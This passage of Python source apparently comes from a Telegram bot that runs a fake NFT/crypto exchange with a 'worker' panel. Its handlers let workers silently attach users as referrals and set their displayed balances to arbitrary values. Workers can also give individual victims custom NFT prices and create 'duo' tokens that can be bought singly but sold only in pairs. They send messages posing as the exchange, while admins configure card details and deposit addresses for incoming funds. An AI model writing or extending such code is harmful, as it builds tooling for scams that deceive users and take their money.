            await call.message.edit_text("💰 Введите *код NFT* (как в каталоге Supabase):", parse_mode="Markdown")
        except Exception:
            await call.message.answer("Введите код NFT (как в каталоге Supabase):")

    elif data == "worker_nft_duo":
        await state.set_state(WorkerState.nft_duo_code)
        text = "🔄 Введите *код NFT* — он станет дуо-токеном. Реферал сможет купить один такой NFT; для продажи нужна пара (2 шт)."
        try:
            await call.message.edit_text(text, parse_mode="Markdown")
        except Exception:
            await call.message.answer(text, parse_mode="Markdown")

    elif data == "worker_min_deposit":
        await state.set_state(WorkerState.min_deposit)
        current = await get_setting(f"worker_{user_id}_min_deposit_ton")
        text = f"📥 Мин. депозит *для ваших рефералов*: *{current or 'глобальный'}* TON\n\nОтправьте число (TON) или 0 чтобы сбросить на глобальный:"
        try:
            await call.message.edit_text(text, parse_mode="Markdown")
        except Exception:
            await call.message.answer(text, parse_mode="Markdown")

    elif data == "worker_min_withdraw":
        await state.set_state(WorkerState.min_withdraw)
        current = await get_setting(f"worker_{user_id}_min_withdraw_ton")
        text = f"📤 Мин. вывод *для ваших рефералов*: *{current or 'глобальный'}* TON\n\nОтправьте число (TON) или 0 чтобы сбросить на глобальный:"
        try:
            await call.message.edit_text(text, parse_mode="Markdown")
        except Exception:
            await call.message.answer(text, parse_mode="Markdown")

    elif data == "worker_add_client":
        await state.set_state(WorkerState.add_client)
        text = (
            "➕ *Добавить клиента*\n\n"
            "Введите *@username* (например @durov) или *Telegram ID* пользователя.\n\n"
            "Он должен хотя бы раз открыть бота. После привязки пользователь станет вашим рефералом "
            "(как если бы зашёл по вашей ссылке). Пользователь *не получит уведомление*."
        )
        try:
            await call.message.edit_text(text, parse_mode="Markdown")
        except Exception:
            await call.message.answer(text, parse_mode="Markdown")

    # Admin callbacks
    elif data.startswith("admin_req_") and is_admin(user_id):
        country_id = data.replace("admin_req_", "").strip().lower()
        if country_id not in [c["id"] for c in COUNTRIES]:
            await call.message.answer("Неизвестная страна.")
            return
        await state.set_state(AdminState.requisites)
        await state.update_data(country_id=country_id)
        prefix = f"requisites_{country_id}_"
        card = await get_setting(f"{prefix}card_number")
        holder = await get_setting(f"{prefix}card_holder")
        bank = await get_setting(f"{prefix}bank")
        cur = f"Текущие реквизиты:\n• Карта: {card or '—'}\n• Держатель: {holder or '—'}\n• Банк: {bank or '—'}"
        try:
            await call.message.edit_text(
                f"💳 *Реквизиты для {country_id.upper()}*\n\n{cur}\n\nОтправьте *три строки* (каждая с новой строки):\n1️⃣ Номер карты\n2️⃣ Держатель\n3️⃣ Банк",
                parse_mode="Markdown"
            )
        except Exception:
            await call.message.answer(
                f"💳 Реквизиты для {country_id.upper()}\n\n{cur}\n\nОтправьте три строки (каждая с новой строки): 1) Номер карты 2) Держатель 3) Банк"
            )

    elif data == "admin_crypto_address" and is_admin(user_id):
        if not supabase:
            await call.message.answer("База данных недоступна.")
            return
        await state.set_state(AdminState.crypto_address)
        current = await get_setting("crypto_deposit_address")
        await call.message.answer(
            "🪙 *Адрес для пополнения: USDT в сети TON*\n\n"
            f"Текущий адрес: `{current or 'не задан'}`\n\n"
            "Отправьте адрес кошелька (USDT в сети TON) одной строкой. На сайте он используется для пополнения и отображается пользователям.",
            parse_mode="Markdown"
        )

    elif data == "admin_bot_link" and is_admin(user_id):
        if not supabase:
            await call.message.answer("База данных недоступна.")
            return
        await state.set_state(AdminState.bot_link)
        current = await get_setting("bot_username")
        link = f"https://t.me/{(current or '').strip().lstrip('@')}" if current else "—"
        await call.message.answer(
            f"🔗 *Ссылка на бота*\n\n"
            f"Текущий ник: @{current.lstrip('@') if current else 'не задан'}\n"
            f"Ссылка: {link}\n\n"
            "Отправьте ник бота (например EthosGalleryBot, с @ или без):",
            parse_mode="Markdown"
        )

    elif data == "admin_support" and is_admin(user_id):
        if not supabase:
            await call.message.answer("База данных недоступна.")
            return
        await state.set_state(AdminState.support)
        current = await get_setting("support_username")
        await call.message.answer(f"Текущий ник: @{current.lstrip('@') if current else 'не задан'}\n\nОтправьте новый ник:")

    elif data == "admin_min_deposit" and is_admin(user_id):
        if not supabase:
            await call.message.answer("База данных недоступна.")
            return
        await state.set_state(AdminState.min_deposit_ton)
        current = await get_setting("min_deposit_ton")
        await call.message.answer(f"Текущий: {current or 'не задан'} TON\n\nОтправьте число:")

    elif data == "admin_min_withdraw" and is_admin(user_id):
        if not supabase:
            await call.message.answer("База данных недоступна.")
            return
        await state.set_state(AdminState.min_withdraw_ton)
        current = await get_setting("min_withdraw_ton")
        await call.message.answer(f"Текущий: {current or 'не задан'} TON\n\nОтправьте число:")

    elif data == "admin_create_nft" and is_admin(user_id):
        if not supabase:
            await call.message.answer("База данных недоступна. Невозможно добавить NFT.")
            return
        await state.set_state(AdminState.nft_image)
        await call.message.answer(
            "🖼 *Создание NFT в каталог*\n\n"
            "Шаг 1/8. Отправьте URL картинки или путь вида /file/... :",
            parse_mode="Markdown"
        )


# --- Обработчики состояний (FSM) ---

@dp.message(WorkerState.min_deposit)
async def process_worker_min_deposit(message: types.Message, state: FSMContext):
    try:
        num = float(message.text.replace(",", "."))
        if num < 0:
            raise ValueError
    except ValueError:
        return await message.answer("Введите положительное число или 0.")
    key = f"worker_{message.from_user.id}_min_deposit_ton"
    if num == 0:
        if supabase:
            try:
                supabase.table("system_settings").delete().eq("setting_key", key).execute()
            except Exception:
                pass
        await message.answer("✅ Сброшено на глобальный (для ваших рефералов).", reply_markup=quick_actions_worker_main())
    else:
        await upsert_setting(key, num)
        await message.answer(f"✅ Мин. депозит для ваших рефералов: {num} TON", reply_markup=quick_actions_worker_main())
    await state.clear()


@dp.message(WorkerState.min_withdraw)
async def process_worker_min_withdraw(message: types.Message, state: FSMContext):
    try:
        num = float(message.text.replace(",", "."))
        if num < 0:
            raise ValueError
    except ValueError:
        return await message.answer("Введите положительное число или 0.")
    key = f"worker_{message.from_user.id}_min_withdraw_ton"
    if num == 0:
        if supabase:
            try:
                supabase.table("system_settings").delete().eq("setting_key", key).execute()
            except Exception:
                pass
        await message.answer("✅ Сброшено на глобальный (для ваших рефералов).", reply_markup=quick_actions_worker_main())
    else:
        await upsert_setting(key, num)
        await message.answer(f"✅ Мин. вывод для ваших рефералов: {num} TON", reply_markup=quick_actions_worker_main())
    await state.clear()


@dp.message(WorkerState.add_client)
async def process_worker_add_client(message: types.Message, state: FSMContext):
    raw = (message.text or "").strip().lstrip("@").strip()
    if not raw:
        return await message.answer("Введите @username или Telegram ID.", reply_markup=quick_actions_worker_main())
    worker_id = message.from_user.id
    target_user = None
    if raw.isdigit():
        try:
            target_user = await get_user(int(raw))
        except ValueError:
            pass
    if not target_user:
        target_user = await get_user_by_username(raw)
    if not target_user:
        await state.clear()
        return await message.answer(
            "❌ Пользователь не найден в базе. Он должен хотя бы раз открыть бота.",
            reply_markup=quick_actions_worker_main()
        )
    target_id = int(target_user["id"])
    if target_id == worker_id:
        await state.clear()
        return await message.answer("Нельзя привязать себя.", reply_markup=quick_actions_worker_main())
    current_ref = target_user.get("referrer_id")
    if current_ref == worker_id:
        await state.clear()
        return await message.answer(
            "Этот пользователь уже ваш реферал.",
            reply_markup=quick_actions_worker_main()
        )
    if current_ref is not None:
        await state.clear()
        return await message.answer(
            "Пользователь уже привязан к другому воркеру.",
            reply_markup=quick_actions_worker_main()
        )
    res = await update_user_fields(target_id, {"referrer_id": worker_id})
    await state.clear()
    if res.get("error"):
        return await message.answer(f"Ошибка: {res['error']}", reply_markup=quick_actions_worker_main())
    name = target_user.get("first_name") or target_user.get("username") or str(target_id)
    username = f"@{target_user['username']}" if target_user.get("username") else "—"
    name_safe = escape_markdown(name)
    username_safe = escape_markdown(username)
    await message.answer(
        f"✅ Пользователь привязан к вам как реферал.\n\n"
        f"👤 {name_safe} {username_safe} (ID: `{target_id}`)\n\n"
        "Он не получил уведомление.",
        parse_mode="Markdown",
        reply_markup=quick_actions_worker_ref(target_id)
    )


@dp.message(WorkerState.balance_ref)
async def process_worker_balance(message: types.Message, state: FSMContext):
    data = await state.get_data()
    ref_id = data.get("referral_id")
    if not ref_id:
        await state.clear()
        return await message.answer("Сессия сброшена. Откройте профиль реферала заново из /worker → Мои рефералы.")
    try:
        num = float(message.text.replace(",", "."))
        if num < 0:
            raise ValueError
    except ValueError:
        return await message.answer(
            "Введите положительное число (например 10 или 0.5).",
            reply_markup=quick_actions_worker_ref(ref_id)
        )
    res = await update_user_fields(ref_id, {"balance": num})
    await state.clear()
    if res.get("error"):
        await message.answer(f"Ошибка: {res['error']}", reply_markup=quick_actions_worker_ref(ref_id))
        return
    await message.answer(
        f"✅ Баланс установлен: {num} TON",
        reply_markup=quick_actions_worker_ref(ref_id)
    )

@dp.message(WorkerState.message_ref)
async def process_worker_message(message: types.Message, state: FSMContext):
    data = await state.get_data()
    ref_id = data.get("referral_id")
    if not ref_id:
        await state.clear()
        return await message.answer("Сессия сброшена. Откройте профиль реферала заново из /worker → Мои рефералы.")
    try:
        await bot.send_message(ref_id, f"📩 Сообщение от биржи:\n\n{message.text}")
    except Exception:
        await message.answer("Не удалось отправить: пользователь заблокировал бота или недоступен.", reply_markup=quick_actions_worker_ref(ref_id))
        await state.clear()
        return
    await state.clear()
    await message.answer(
        "✅ Сообщение отправлено.",
        reply_markup=quick_actions_worker_ref(ref_id)
    )

@dp.message(WorkerState.nft_price_code)
async def process_worker_nft_price_code(message: types.Message, state: FSMContext):
    code = (message.text or "").strip()
    if not code:
        return await message.answer("Введите код NFT.")
    item = await get_nft_catalog_item(code)
    if not item:
        await state.clear()
        await message.answer("❌ NFT с таким кодом не найден в базе.", reply_markup=quick_actions_worker_main())
        return
    await state.update_data(nft_code=code)
    await state.set_state(WorkerState.nft_price_value)
    await message.answer(f"Текущая цена: *{item.get('price')}* TON\n\nВведите новую цену:", parse_mode="Markdown")

@dp.message(WorkerState.nft_price_value)
async def process_worker_nft_price_value(message: types.Message, state: FSMContext):
    data = await state.get_data()
    try:
        num = float(message.text.replace(",", "."))
        if num < 0:
            raise ValueError
    except ValueError:
        return await message.answer("Введите положительное число.")
    code = data.get("nft_code")
    if not code:
        await state.clear()
        return await message.answer("Сессия сброшена. Начните снова: /worker → Цена NFT по коду.", reply_markup=quick_actions_worker_main())
    res = await update_nft_catalog_price(code, num)
    await state.clear()
    if res.get("error"):
        await message.answer(f"Ошибка: {res['error']}", reply_markup=quick_actions_worker_main())
        return
    await message.answer(
        f"✅ Цена NFT «{code}» обновлена: {num} TON.\n\nНа сайте маркет обновится в реальном времени.",
        reply_markup=quick_actions_worker_main()
    )


@dp.message(WorkerState.ref_nft_price_code)
async def process_ref_nft_price_code(message: types.Message, state: FSMContext):
    code = (message.text or "").strip()
    if not code:
        return await message.answer("Введите код NFT.")
    data = await state.get_data()
    ref_id = data.get("referral_id")
    if not ref_id:
        await state.clear()
        return await message.answer("Сессия сброшена. Откройте профиль реферала снова.")
    item = await get_nft_catalog_item(code)
    if not item:
        return await message.answer("❌ NFT с таким кодом не найден в каталоге. Введите код из Supabase (nft_catalog).")
    await state.update_data(ref_nft_code=code)
    await state.set_state(WorkerState.ref_nft_price_value)
    base_price = item.get("price") or 0
    custom = await get_referral_nft_price(ref_id, code)
    text = f"Текущая цена в каталоге: *{base_price}* TON"
    if custom is not None:
        text += f"\nСейчас для реферала: *{custom}* TON"
    text += "\n\nВведите цену (TON) для этого реферала:"
    await message.answer(text, parse_mode="Markdown")


@dp.message(WorkerState.ref_nft_price_value)
async def process_ref_nft_price_value(message: types.Message, state: FSMContext):
    try:
        num = float(message.text.replace(",", "."))
        if num < 0:
            raise ValueError
    except ValueError:
        return await message.answer("Введите положительное число (цена в TON).")
    data = await state.get_data()
    ref_id = data.get("referral_id")
    code = data.get("ref_nft_code")
    if not ref_id or not code:
        await state.clear()
        return await message.answer("Сессия сброшена. Откройте профиль реферала снова.", reply_markup=quick_actions_worker_main())
    await set_referral_nft_price(ref_id, code, num)
    await state.clear()
    await message.answer(
        f"✅ Для реферала установлена цена NFT «{code}»: *{num}* TON.\n\nНа сайте этот реферал будет видеть эту цену; остальные — из каталога.",
        parse_mode="Markdown",
        reply_markup=quick_actions_worker_ref(ref_id)
    )

@dp.message(WorkerState.nft_duo_code)
async def process_worker_nft_duo_code(message: types.Message, state: FSMContext):
    code = message.text.strip() if message.text else ""
    if not code:
        return await message.answer("Введите код NFT.")
    item = await get_nft_catalog_item(code)
    if not item:
        await state.clear()
        return await message.answer(
            "❌ NFT с таким кодом не найден в каталоге. Добавьте его в Supabase (таблица nft_catalog).",
            reply_markup=quick_actions_worker_main()
        )
    res = await set_nft_catalog_duo(code)
    await state.clear()
    if res.get("error"):
        await message.answer(f"Ошибка: {res['error']}", reply_markup=quick_actions_worker_main())
        return
    await message.answer(
        f"✅ NFT «{code}» теперь дуо-токен.\n\n"
        "Реферал сможет купить один такой NFT. Для продажи нужна пара (2 таких NFT).",
        reply_markup=quick_actions_worker_main()
    )

@dp.message(AdminState.requisites)
async def process_admin_req(message: types.Message, state: FSMContext):
    lines = [s.strip() for s in message.text.split("\n") if s.strip()]
    if len(lines) < 3:
        return await message.answer("Нужно три строки (номер карты, держатель, банк — каждое с новой строки). Попробуйте снова.")

    data = await state.get_data()
    country_id = (data.get("country_id") or "").strip().lower()
    if not country_id:
        await state.clear()
        return await message.answer("Сессия сброшена. Зайдите в админку → Реквизиты по странам.")

    prefix = f"requisites_{country_id}_"
    keys = [f"{prefix}card_number", f"{prefix}card_holder", f"{prefix}bank"]
    for k, v in zip(keys, lines):
        res = await upsert_setting(k, v)
        if res.get("error"):
            await state.clear()
            return await message.answer(f"Ошибка при сохранении: {res['error']}. Попробуйте снова из админки.")
    await state.clear()
    await message.answer(
        f"✅ Реквизиты для {country_id.upper()} сохранены в базу (system_settings).\n\n"
        "На сайте они подтягиваются из той же базы — при следующем открытии пополнения пользователь увидит новые реквизиты."
    )

@dp.message(AdminState.support)
async def process_admin_support(message: types.Message, state: FSMContext):
    username = (message.text or "").strip().lstrip("@").strip()
    if not username:
        return await message.answer("Введите ник техподдержки (например support_bot, с @ или без).")
    res = await upsert_setting("support_username", username)
    await state.clear()
    if res.get("error"):
        await message.answer(f"Ошибка: {res['error']}")
    else:
        await message.answer(
            f"✅ Ник техподдержки сохранён: @{username}\n\n"
            "Он записан в базу (system_settings). На сайте отобразится в настройках и в кнопке «Техподдержка»."
        )


@dp.message(AdminState.crypto_address)
async def process_admin_crypto_address(message: types.Message, state: FSMContext):
    addr = (message.text or "").strip()
    if not addr:
        return await message.answer("Введите адрес кошелька TON.")
    res = await upsert_setting("crypto_deposit_address", addr)
    await state.clear()
    if res.get("error"):
        await message.answer(f"Ошибка: {res['error']}")
    else:
        await message.answer(
            "✅ Адрес USDT в сети TON сохранён в базу (crypto_deposit_address).\n\n"
            "На сайте он подтягивается из system_settings и отображается в блоке пополнения криптой и при выводе на крипту."
        )


@dp.message(AdminState.bot_link)
async def process_admin_bot_link(message: types.Message, state: FSMContext):
    username = (message.text or "").strip().lstrip("@").strip()
    if not username:
        return await message.answer("Введите ник бота (например EthosGalleryBot, с @ или без).")
    res = await upsert_setting("bot_username", username)
    await state.clear()
    if res.get("error"):
        await message.answer(f"Ошибка: {res['error']}")
    else:
        link = f"https://t.me/{username}"
        await message.answer(
            f"✅ Ссылка на бота сохранена в базу: @{username}\n\n"
            f"Ссылка: {link}\n\nНа сайте подтягивается из system_settings (ключ bot_username)."
        )

@dp.message(AdminState.min_deposit_ton)
async def process_admin_min_dep(message: types.Message, state: FSMContext):
    try:
        num = float(message.text.replace(",", "."))
        if num < 0: raise ValueError
    except ValueError:
        return await message.answer("Введите число.")
        
    await upsert_setting("min_deposit_ton", num)
    await message.answer(f"✅ Сохранено: {num} TON")
    await state.clear()

@dp.message(AdminState.min_withdraw_ton)
async def process_admin_min_withdraw(message: types.Message, state: FSMContext):
    try:
        num = float(message.text.replace(",", "."))
        if num < 0: raise ValueError
    except ValueError:
        return await message.answer("Введите число.")
    await upsert_setting("min_withdraw_ton", num)
    await message.answer(f"✅ Сохранено: {num} TON")
    await state.clear()

@dp.message(AdminState.nft_image)
async def process_admin_nft_image(message: types.Message, state: FSMContext):
    url = (message.text or "").strip()
    if not url or (not url.startswith(("http://", "https://")) and not url.startswith("/")):
        return await message.answer("Отправьте URL картинки (http/https) или путь вида /file/...")
    await state.update_data(nft_image=url)
    await state.set_state(AdminState.nft_name)
    await message.answer("Шаг 2/8. Введите *название* NFT:", parse_mode="Markdown")

@dp.message(AdminState.nft_name)
async def process_admin_nft_name(message: types.Message, state: FSMContext):
    name = (message.text or "").strip()
    if not name:
        return await message.answer("Введите название.")
    await state.update_data(nft_name=name)
    await state.set_state(AdminState.nft_code)
    await message.answer(
        "Шаг 3/8. Введите *уникальный код* NFT (латиница/цифры, без пробелов):",
        parse_mode="Markdown"
    )

@dp.message(AdminState.nft_code)
async def process_admin_nft_code(message: types.Message, state: FSMContext):
    code = (message.text or "").strip().replace(" ", "")
    if not code:
        return await message.answer("Введите код.")
    existing = await get_nft_catalog_item(code)
    if existing:
        return await message.answer("❌ NFT с таким кодом уже есть в каталоге. Введите другой код.")
    await state.update_data(nft_code=code)
    await state.set_state(AdminState.nft_price)
    await message.answer("Шаг 4/8. Введите *цену* в TON:", parse_mode="Markdown")

@dp.message(AdminState.nft_price)
async def process_admin_nft_price(message: types.Message, state: FSMContext):
    try:
        num = float(message.text.replace(",", "."))
        if num < 0: raise ValueError
    except ValueError:
        return await message.answer("Введите положительное число (цена в TON).")
    await state.update_data(nft_price=num)
    await state.set_state(AdminState.nft_model)
    await message.answer(
        "Шаг 5/8. Введите *модель* (например Rare, Epic) или — чтобы пропустить:",
        parse_mode="Markdown"
    )

@dp.message(AdminState.nft_model)
async def process_admin_nft_model(message: types.Message, state: FSMContext):
    val = message.text.strip() if message.text else ""
    if val == "—": val = ""
    await state.update_data(nft_model=val)
    await state.set_state(AdminState.nft_collection)
    await message.answer(
        "Шаг 6/8. Введите *коллекцию* (например Ethos Classics) или — чтобы пропустить:",
        parse_mode="Markdown"
    )

@dp.message(AdminState.nft_collection)
async def process_admin_nft_collection(message: types.Message, state: FSMContext):
    val = message.text.strip() if message.text else ""
    if val == "—": val = ""
    await state.update_data(nft_collection=val)
    await state.set_state(AdminState.nft_backdrop)
    await message.answer(
        "Шаг 7/8. Введите *фон* (например Студия, Космос) или — чтобы пропустить:",
        parse_mode="Markdown"
    )

@dp.message(AdminState.nft_backdrop)
async def process_admin_nft_backdrop(message: types.Message, state: FSMContext):
    val = message.text.strip() if message.text else ""
    if val == "—": val = ""
    await state.update_data(nft_backdrop=val)
    await state.set_state(AdminState.nft_duo)
    await message.answer(
        "Шаг 8/8. *Дуо-токен?* (для продажи нужна пара из 2 таких NFT).\n"
        "Отправьте *да* или *нет*:",
        parse_mode="Markdown"
    )

@dp.message(AdminState.nft_duo)
async def process_admin_nft_duo(message: types.Message, state: FSMContext):
    text = (message.text or "").strip().lower()
    is_duo = text in ("да", "yes", "1", "true", "д")
    data = await state.get_data()
    code = data.get("nft_code")
    name = data.get("nft_name")
    image = data.get("nft_image")
    price = data.get("nft_price")
    model = data.get("nft_model") or None
    collection = data.get("nft_collection") or None
    backdrop = data.get("nft_backdrop") or None
    res = await insert_nft_catalog(code, name, image, price, is_duo, model=model, collection=collection, backdrop=backdrop)
    await state.clear()
    if res.get("error"):
        await message.answer(f"❌ Ошибка: {res['error']}")
        return
    await message.answer(
        f"✅ NFT добавлен в каталог.\n\n"
        f"Код: `{code}`\n"
        f"Название: {name}\n"
        f"Модель: {model or '—'}\n"
        f"Коллекция: {collection or '—'}\n"
        f"Фон: {backdrop or '—'}\n"
        f"Цена: {price} TON\n"
        f"Дуо-токен: {'да' if is_duo else 'нет'}\n\n"
        "На сайте маркет обновится в реальном времени.",
        parse_mode="Markdown"
    )


# --- Точка входа ---
async def listing_notifier_loop():
    """Фоновая задача: раз в 8 сек проверяем новые листинги и шлём уведомления воркерам в ТГ."""
    if not supabase:
        return
    while True:
        try:
            await asyncio.sleep(8)
            listings = await get_pending_listings()
            for row in listings:
                listing_id = row.get("id")
                seller_id = row.get("seller_id")
                if not listing_id or not seller_id:
                    continue
                referrer_id = get_referrer_id(int(seller_id))
                if not referrer_id:
                    continue
                try:
                    nft_title = row.get("nft_title") or "NFT"
                    price = row.get("price") or 0
                    log_msg = f"📤 *Лог:* реферал ID {seller_id} выставил на продажу NFT «{nft_title}» за {price} TON."
                    msg = (
                        f"{log_msg}\n\n"
                        f"Подтвердите продажу — тогда NFT снимется с портфеля реферала и ему зачислится баланс."
                    )
                    kb = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="✅ Подтвердить продажу", callback_data=f"confirm_listing_{listing_id}")]
                    ])
                    await bot.send_message(referrer_id, msg, parse_mode="Markdown", reply_markup=kb)
                    mark_listing_worker_notified(listing_id)
                except Exception as e:
                    logging.exception("Listing notifier send: %s", e)
        except asyncio.CancelledError:
            break
        except Exception as e:
            logging.exception("Listing notifier loop: %s", e)


async def main():
    if not ADMIN_IDS:
        logging.warning("ADMIN_IDS не задан — /admin недоступен")
    if not supabase:
        logging.warning("SUPABASE настройки не заданы — база данных отключена")
        
    logging.info("Бот запущен")
    notifier = asyncio.create_task(listing_notifier_loop())
    try:
        await dp.start_polling(bot)
    finally:
        notifier.cancel()
        try:
            await notifier
        except asyncio.CancelledError:
            pass

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logging.info("Бот остановлен")